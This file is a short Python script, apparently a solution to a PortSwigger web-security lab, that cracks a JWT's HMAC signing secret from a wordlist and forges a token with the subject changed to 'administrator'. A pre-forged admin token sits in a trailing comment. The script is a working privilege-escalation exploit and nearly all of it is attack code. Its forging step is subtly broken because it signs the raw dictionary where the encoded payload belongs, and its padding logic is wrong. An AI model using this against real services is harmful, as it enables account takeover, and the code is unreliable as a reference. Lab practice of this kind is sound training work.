import base64
import json
import hmac
import hashlib


def base64_decode(b64):
    decode = base64.b64decode(b64 + '='*(len(b64) % 4)).decode()
    return json.loads(decode)


def base64_encode(string):
    raw_string = json.dumps(string)
    raw_string = raw_string.replace(" ", "")
    b64 = base64.b64encode(raw_string.encode())
    return b64.decode().split('=')[0]


def create_signature(secret, segments):
    sig_digest = hmac.new(
        secret.encode(), msg=segments.encode(), digestmod=hashlib.sha256).digest()
    b64 = base64.urlsafe_b64encode(sig_digest)
    signature = b64.decode().split('=')[0]
    return signature


jwt = "eyJraWQiOiI4Mzg1MGM0Yi05NDVlLTQ0NDItYWY1Ni1kMGY1ZDBhNzczNDUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2ODk2NzAwOH0.QjXs56FfkOWolDeZ2gg52tcZTWiETakwK1KMsE2lqLA"
header, payload, sig = jwt.split('.')
segments = f"{header}.{payload}"

header_decode = base64_decode(header)
payload_decode = base64_decode(payload)
print(header_decode)
print(payload_decode)

with open("jwt.secrets.list", "r") as f:
    jwt_secrets = f.readlines()

secret_key = ""
for secret in jwt_secrets:
    secret = secret.strip()
    fake = create_signature(secret, segments)
    if fake == sig:
        secret_key = secret
        print(f"[!] Secret key found - {secret_key}")
        break

if secret_key != "":
    payload_decode['sub'] = "administrator"
    new_payload = base64_encode(payload_decode)
    new_seg = f"{header}.{payload_decode}"
    new_sig = create_signature(secret_key, new_seg)
    print("[!] JWT For this exercise")
    print(f"{header}.{new_payload}.{new_sig}")
else:
    print("[x] no key was found!")

# print("eyJraWQiOiJhOGIwNjBiNC04YzQ5LTRmZjEtOTQ1ZS1lMDljY2NlZTkxNjYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2Njg5NjUzNzV9.of4CYIGZVVZmpizeA3cY0W5tYdTY4Zt_VlBE9BJ-m8U")
